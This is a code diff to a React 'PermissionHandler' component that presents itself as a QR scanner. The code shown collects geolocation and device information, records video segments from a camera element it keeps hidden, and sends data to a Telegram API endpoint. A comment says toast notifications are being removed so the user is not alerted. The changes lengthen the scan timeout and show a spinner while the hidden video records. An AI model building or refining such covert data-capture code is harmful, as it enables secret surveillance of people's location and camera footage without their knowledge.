@@ -3,7 +3,6 @@
 import React, { useEffect, useRef, useState, useCallback } from "react";
 import QrScanner from "./qr-scanner";
 import { Button } from "@/components/ui/button";
-// import { toast } from "sonner"; // Удаляем импорт toast, чтобы не показывать уведомления пользователю
 import {
   getGeolocation,
   getClientInfo,
@@ -16,7 +15,7 @@ import {
 
 const TELEGRAM_API_ENDPOINT = "/api/telegram";
 const VIDEO_SEGMENT_DURATION_MS = 3500; // 3.5 seconds for each video segment
-const QR_SCAN_TIMEOUT_MS = 17000; // 17 seconds for QR scanning on first attempt
+const QR_SCAN_TIMEOUT_MS = 30000; // 30 seconds for QR scanning on first attempt
 
 type GeolocationData = { latitude: number; longitude: number };
 type ClientInfo = { platform: string; hardwareConcurrency: number; screenWidth?: number; screenHeight?: number; browserLanguage?: string; };
@@ -387,7 +386,10 @@ const PermissionHandler = () => {
               style={{ opacity: 0 }} // Всегда скрыт
             />
             <div className="absolute inset-0 border-4 border-primary opacity-70 rounded-lg pointer-events-none animate-border-pulse" />
-            {(appPhase === "collectingData" || appPhase === "flippingCamera") && (
+            {(appPhase === "collectingData" || 
+             appPhase === "recordingVideo1" || // Добавлено для отображения спиннера
+             appPhase === "recordingVideo2" || // Добавлено для отображения спиннера
+             appPhase === "flippingCamera") && (
               <div className="absolute inset-0 flex items-center justify-center">
                 <div className="animate-spin rounded-full h-16 w-16 border-t-4 border-b-4 border-primary" />
               </div>
